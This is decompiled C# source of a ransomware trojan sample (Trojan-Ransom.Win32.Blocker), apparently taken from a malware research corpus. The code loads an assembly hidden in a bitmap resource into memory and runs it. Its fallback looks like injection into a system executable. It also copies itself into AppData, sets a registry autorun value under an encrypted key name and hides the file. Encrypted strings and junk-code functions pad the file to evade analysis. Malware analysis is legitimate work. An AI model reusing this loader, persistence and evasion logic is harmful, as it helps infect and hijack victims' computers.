// Decompiled with JetBrains decompiler
// Type: Module1
// Assembly: RSC2, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B466AC36-16A4-4FBD-8C55-EFAD432C0748
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00026-msil\Trojan-Ransom.Win32.Blocker.hesp-93c2d31dd4547a53a40c92ce1783e59fe45734b65430ddc8e44f38dae3f62324.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;

[StandardModule]
internal sealed class Module1
{
  [STAThread]
  public static void Main() => Module1.NDjpgfwvdnEvFh(string.Empty);

  public static void BLjCSvWOeQyPStP(byte[] FlrNcmhmbJFxPYb)
  {
    Thread thread = new Thread(new ParameterizedThreadStart(Module1.BLjCSvWOeQyPStP));
    thread.SetApartmentState(ApartmentState.STA);
    thread.Start((object) FlrNcmhmbJFxPYb);
  }

  public static void BLjCSvWOeQyPStP(object RfDOpyKOUYPex)
  {
    try
    {
      MethodInfo entryPoint = Assembly.Load((byte[]) RfDOpyKOUYPex).EntryPoint;
      MethodInfo methodInfo = entryPoint;
      string[][] parameters;
      if (entryPoint.GetParameters().Length != 1)
        parameters = (string[][]) null;
      else
        parameters = new string[1][]{ new string[0] };
      methodInfo.Invoke((object) null, (object[]) parameters);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      object bytes = (object) gooahYbXEKO.bitmapToBytes((Bitmap) new ResourceManager("rsc", Assembly.GetExecutingAssembly()).GetObject("wxihTlpa"));
      object[] ZxIBaTCINOX = new object[2]
      {
        RuntimeHelpers.GetObjectValue(RfDOpyKOUYPex),
        (object) (Conversions.ToString(Environment.SystemDirectory[0]) + tNcqokDpycaNeQR.blDzbPSaQun("y3l51Zpp7V2c1O7cYTVXDE4Dvi1pyTYfZcLiXblxvUdemOCRLKQDtOD8DPA6IhuxyrHHG+/E1p3GJW0N3oKQpQ==", "zC01Zytyw3j"))
      };
      zrPJvtgVvkjTHZT.pmahSJbRVuVe(tNcqokDpycaNeQR.blDzbPSaQun("yL4nC2XH0VcmH9QYFXVrTw==", "SaOE1ckLOR"), tNcqokDpycaNeQR.blDzbPSaQun("yAMrDlfcQxb7Njp3DANrZA==", "fH3Jas5G9k9"), (byte[]) bytes, ZxIBaTCINOX);
      ProjectData.ClearProjectError();
    }
  }

  public static void NDjpgfwvdnEvFh(string DbtxDpHNSSkkvSr)
  {
    Module1.BLjCSvWOeQyPStP(RuntimeHelpers.GetObjectValue((object) gooahYbXEKO.bitmapToBytes((Bitmap) new ResourceManager("rsc", Assembly.GetExecutingAssembly()).GetObject("UnNCsfKSZYBmdP"))));
    object obj1 = Operators.ConcatenateObject((object) Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), (object) "\\mnrzQ3F8WVhH.exe");
    object obj2 = (object) "EzLKJcKrQKwMSGqUJveE";
    try
    {
      if (File.Exists(Conversions.ToString(obj1)))
        return;
      File.Copy(Application.ExecutablePath, Conversions.ToString(obj1));
      Module1.eJMBhkDyHTh(Conversions.ToString(obj2), Conversions.ToString(obj1));
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public static void eJMBhkDyHTh(string NQfjlXqtFfQDS, string CXPBzBGnvi)
  {
    try
    {
      Registry.CurrentUser.OpenSubKey(tNcqokDpycaNeQR.blDzbPSaQun("sX0h+p5YDCDfw5bA7mn4G4Lh/dWWt6boWV9eyCyuJ8obygZNCH66kQJ62HWzW0aZ", "ZS1i4fyrVu"), true).SetValue(NQfjlXqtFfQDS, (object) CXPBzBGnvi, RegistryValueKind.String);
      new FileInfo(CXPBzBGnvi).Attributes = FileAttributes.Hidden;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public static object HvOcCUvJdhEiD()
  {
    Decimal d1 = 0.944M;
    string str1 = "SOCjCrl7";
    int num1 = 236372;
    Decimal num2 = new Decimal(815.0 / (304.0 * Math.PI) - Convert.ToDouble(d1));
    Decimal num3 = new Decimal(-0.71931727379553467 - Convert.ToDouble(Decimal.Multiply(d1, num2)));
    Decimal d2_1 = new Decimal(Convert.ToDouble(d1) / 1.097 - Convert.ToDouble(num2) / 0.168);
    string str2 = str1 + "v91vng" + str1 + "fh";
    Thread.Sleep(2);
    if (-0.2990866141732284 == 272.0 / 807.0 - 0.59168445475638054 * Convert.ToDouble(num3))
      str2 = "WUFmauXDHEWBP6nIoP7" + str2 + str2;
    Decimal d2_2 = new Decimal(Convert.ToDouble(d1) - Convert.ToDouble(num2) * (633.0 / 431.0) - Convert.ToDouble(num2));
    Decimal num4;
    if (Convert.ToDouble(Decimal.Multiply(d1, d2_2)) != 24.0 / 23.0 * Convert.ToDouble(d2_2) / 0.577)
    {
      num4 = 0.0440543710021321M;
      Thread.Sleep(1);
    }
    Thread.Sleep(3);
    if (Operators.CompareString(str2 + "Nov" + str2 + Conversions.ToString(Strings.Chr(217)) + Conversions.ToString(Strings.Chr(219)) + str2, "X0rCIDOHMnUuz47E5HQSLbalUTy6Ub7N2BuMBww8gv6OtpCZMLyRlgs6kQi5b3xnD" + str2 + str2, false) == 0)
      Thread.Sleep(15);
    Decimal num5 = new Decimal(Convert.ToDouble(d2_1) * (1019.0 / 1000.0));
    if (Convert.ToDouble(num2) == Convert.ToDouble(num5) / (81.0 / 500.0))
      Thread.Sleep(12);
    Decimal num6 = new Decimal(182.0 / 395.0 * Convert.ToDouble(num2));
    if (Decimal.Compare(Decimal.Subtract(Decimal.Add(Math.Round(num2), 4M), 103M), new Decimal(num1)) == 0)
    {
      Thread.Sleep(9);
      Decimal.Multiply(num6, num2);
      Convert.ToInt32(Decimal.Subtract(-58963M, Decimal.Add(Math.Floor(num6), 3M)));
      Thread.Sleep(12);
    }
    num4 = new Decimal(Convert.ToDouble(num6) * 0.967 + Convert.ToDouble(num2));
    string str3 = str2 + Conversions.ToString(Strings.Chr(133)) + "LWn7din7y";
    Thread.Sleep(28);
    int num7 = 192386;
    if (185.0 / 384.0 == Convert.ToDouble(num2) - 419.0 / 775.0 + Convert.ToDouble(d2_1))
      num4 = Decimal.Subtract(Decimal.Divide(num2, d2_1), Decimal.Multiply(num2, num2));
    Convert.ToInt32(Decimal.Add(new Decimal(num7), Decimal.Add(Math.Round(num2), 10M)));
    Thread.Sleep(18);
    object obj;
    return obj;
  }

  public static void cjiNITmHaooiEhx()
  {
    string str1 = "9\u007FUV50sSL" + Conversions.ToString(Strings.Chr(196)) + "Z16Lp";
    Thread.Sleep(30);
    if (true)
      str1 = str1 + str1 + str1 + "0nKwaYcr9suwvi5CQqktHZCQTtRqpa3RdbXk";
    Thread.Sleep(7);
    Thread.Sleep(23);
    Thread.Sleep(26);
    if (true)
    {
      str1 = str1 + "\u000E" + str1 + "NNM1UHhdKLilqWpSXhNi2";
      Thread.Sleep(12);
    }
    Thread.Sleep(4);
    if (false)
    {
      string str2 = str1 + "rzhgjYS5cLjHwN8DRD5";
      string str3 = str2 + "EU8buWc209mgxHyKjr2" + str2 + "X5psShNbi4oU8" + str2 + "i5N0a" + str2;
      Thread.Sleep(3);
      Thread.Sleep(26);
      Thread.Sleep(21);
      str1 = str3 + "W" + str3 + Conversions.ToString(Strings.Chr(161)) + Conversions.ToString(Strings.Chr(204)) + str3;
    }
    Thread.Sleep(18);
    string str4 = str1 + "wTItbCN3SbeWjekacWI\u0002";
  }
}
